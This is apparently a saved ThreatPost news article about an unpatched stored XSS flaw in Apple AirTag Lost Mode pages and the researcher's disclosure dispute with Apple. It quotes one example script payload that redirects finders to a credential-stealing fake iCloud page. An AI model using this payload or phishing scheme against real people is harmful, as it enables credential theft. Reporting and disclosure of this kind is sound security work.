# Apple AirTag Zero-Day Weaponizes Trackers
### Apple’s personal item-tracker devices can be used to deliver malware, slurp credentials, steal tokens and more thanks to XSS.

## Information:
+ Source: ThreatPost
+ Link: [article](https://kasperskycontenthub.com/threatpost-global/?p=175143)
+ Date: September 29, 2021  4:48 pm
+ Author: Tara Seals


## Article:
![](https://media.threatpost.com/wp-content/uploads/sites/103/2021/09/29163222/airtag-e1632947561894.jpg)
An unpatched stored cross-site scripting (XSS) bug in Apple’s AirTag “Lost Mode” could open up users to a cornucopia of web-based attacks, including credential-harvesting, click-jacking, malware delivery, token theft and more.


That’s according to Bobby Rauch, an independent security researcher who said that it’s possible to use the zero-day to fully weaponize an AirTag, with the ability to attack random strangers (or specific targets) should they interact with it.


Stored XSS, also known as persistent XSS, [occurs when](https://threatpost.com/xss-bug-seopress-wordpress-plugin/168702/) a malicious script is injected directly into a vulnerable web application. An attack then only requires that a victim visit a compromised web page.


[![Infosec Insiders Newsletter](https://media.threatpost.com/wp-content/uploads/sites/103/2021/07/10165815/infosec_insiders_in_article_promo.png)](https://threatpost.com/infosec-insider-subscription-page/?utm_source=ART&utm_medium=ART&utm_campaign=InfosecInsiders_Newsletter_Promo/)


A word about how AirTags work: Apple’s AirTags are personal tracking devices that can be attached to keys, backpacks and other items. If an AirTagged item is lost and nearby, a user can “ping” the AirTag, which will emit a sound and allow it to be tracked down. If it’s further afield (left behind in a restaurant etc.), the AirTag sends out a secure Bluetooth signal that can be detected by nearby devices in Apple’s Find My network (which [has had its own issues](https://threatpost.com/apple-find-my-exploited-bluetooth/166121/) in the past). These devices send the location of the AirTag to iCloud — and the user can open the Find My app and see the lost item on a map.


The Lost Mode function goes hand in hand with the further-afield function. If an AirTag doesn’t show up in the Find My app, a user can mark the AirTag as missing, and will get an alert if it’s later picked up by the Find My network.


But the problematic part of Lost Mode has to do with a different perk: If a stranger finds an AirTag in Lost Mode and scans it via near-field communication (NFC), it generates a unique https://found.apple.com page, containing its serial number, phone number and a personal message for anyone discovering it. The idea is to let people “turn in” missing items to their rightful owners.


The issue, according to Rauch, is that these pages don’t have protection for stored XSS – so, an attacker can inject a malicious payload into the AirTag using the Lost Mode phone number field.


In one attack scenario, cybercriminals can use XSS code to redirect victims to the attacker’s fake iCloud page, which has a keylogger installed to capture their credentials.


“A victim will believe they are being asked to sign into iCloud so they can get in contact with the owner of the AirTag, when in fact, the attacker has redirected them to a credential-hijacking page,” Rauch said, in [a Tuesday posting](https://medium.com/@bobbyrsec/zero-day-hijacking-icloud-credentials-with-apple-airtags-stored-xss-6997da43a216). “”Since Airtags were recently released, most users would be unaware that accessing the https://found.apple.com page doesn’t require authentication at all.”


He added, “An attacker can create weaponized AirTags and leave them around, victimizing innocent people who are simply trying to help a person find their lost AirTag.”


Rauch provided an example malicious payload to be entered into the phone number field: “<script>window.location=’https://10.0.1.137:8000/indexer.html’;var a = ”;</script>”. He also noted that AirTags could be weaponized to carry out all sorts of attacks.


“[This is] only one example of the dangers of stored XSS,” he wrote in a Tuesday analysis. “There are countless ways an attacker could victimize an end user who discovers a lost AirTag…The https://found.apple.com link can also be used as a phishing link, and shared via a desktop/laptop, without the need for a mobile device to scan the Airtag. Further injection attacks could occur through the Find My App, which is used to scan third-party devices that support “Lost Mode” as part of Apple’s Find My network.”


The bug has yet to be patched, although Rauch [told](https://krebsonsecurity.com/2021/09/apple-airtag-bug-enables-good-samaritan-attack/) Brian Krebs that he reported it to Apple on June 20. Last week, the company told him that it waplanning to patch “in an upcoming update.”


Absent being given a timeline for a fix or any response to his multiple questions about credit and acknowledgement, Rauch told Krebs he decided to go public.


***Check out our free***[***upcoming live and on-demand webinar events***](https://threatpost.com/category/webinars/) ***– unique, dynamic discussions with cybersecurity experts and the Threatpost community.***




#### Tags:
[[AirTag]] [[Apple’s]] [[AirTags]] [[Rauch]] [[it’s]] [[AirTag,]] [[iCloud]] [[https://found.apple.com]] [[ThreatPost]]
